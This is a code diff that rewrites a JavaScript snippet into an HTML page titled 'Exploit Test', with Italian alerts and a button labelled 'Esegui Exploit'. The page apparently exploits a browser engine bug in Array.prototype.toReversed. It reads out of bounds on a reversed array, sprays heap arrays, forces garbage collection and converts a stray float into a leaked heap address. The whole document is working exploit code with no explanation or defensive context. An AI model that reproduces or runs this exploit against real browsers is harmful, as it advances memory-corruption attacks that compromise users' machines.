@@ -1,39 +1,65 @@
-const v1 = [-1n]; // create a JSArray 
-let v2;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit Test</title>
+    <script>
+        function sleepSeconds(seconds) {
+            return new Promise(resolve => setTimeout(resolve, seconds * 1000));
+        }
 
-// Controllo se .toReversed() esiste
-if (Array.prototype.toReversed) {
-    alert("Usando toReversed() per v1");
-    v2 = v1.toReversed(); // call arrayProtoFuncToReversed
-} else {
-    alert("toReversed() non esiste! Usando reverse() per v1");
-    v2 = [...v1].reverse(); // Alternativa se toReversed non è disponibile
-}
+        function gc() {
+            new Uint8Array(4 * 1024 * 1024);
+        }
 
-alert(describe(v2));
-sleepSeconds(5); // pause execution
-alert(v2[2]?.print()); // access randomly a field of v2[2]
+        function hex(val) {
+            return "0x" + val.toString(16);
+        }
 
-// 2 Leaking addresses
-function gc() {
-    new Uint8Array(4 * 1024 * 1024);
-}
+        function f2i(val) {
+            return new DataView(new Float64Array([val]).buffer).getBigUint64(0, true);
+        }
 
-let spray_arr = new Array(0x20);
-for (let i = 0; i < 0x40; i++) {
-   spray_arr[i] = [2.1*i, 2.2, 2.3]; // spray some arrays
-}
-gc(); // clean memory and force allocation reusing above’s heap 
+        async function exploit() {
+            const v1 = [-1n]; 
+            let v2;
 
-let b1 = [1.1];
+            if (Array.prototype.toReversed) {
+                alert("Usando toReversed() per v1");
+                v2 = v1.toReversed();
+            } else {
+                alert("toReversed() non esiste! Usando reverse() per v1");
+                v2 = [...v1].reverse();
+            }
 
-if (Array.prototype.toReversed) {
-    alert("Usando toReversed() per b1");
-    b1 = b1.toReversed();
-} else {
-    alert("toReversed() non esiste! Usando reverse() per b1");
-    b1 = [...b1].reverse();
-}
+            alert("Descrizione di v2: " + JSON.stringify(v2));
+            await sleepSeconds(5);
+            alert("Accesso a v2[2]: " + (v2[2]?.toString() || "undefined"));
 
-let addr1 = f2i(b1[1]); // b1[1] is previous heap chunk and will be leaked
-alert("leak1: " + hex(addr1));
+            let spray_arr = new Array(0x20);
+            for (let i = 0; i < 0x40; i++) {
+                spray_arr[i] = [2.1 * i, 2.2, 2.3];
+            }
+            gc();
+
+            let b1 = [1.1];
+
+            if (Array.prototype.toReversed) {
+                alert("Usando toReversed() per b1");
+                b1 = b1.toReversed();
+            } else {
+                alert("toReversed() non esiste! Usando reverse() per b1");
+                b1 = [...b1].reverse();
+            }
+
+            let addr1 = f2i(b1[1]);
+            alert("leak1: " + hex(addr1));
+        }
+    </script>
+</head>
+<body>
+    <h1>Exploit Test</h1>
+    <button onclick="exploit()">Esegui Exploit</button>
+</body>
+</html>
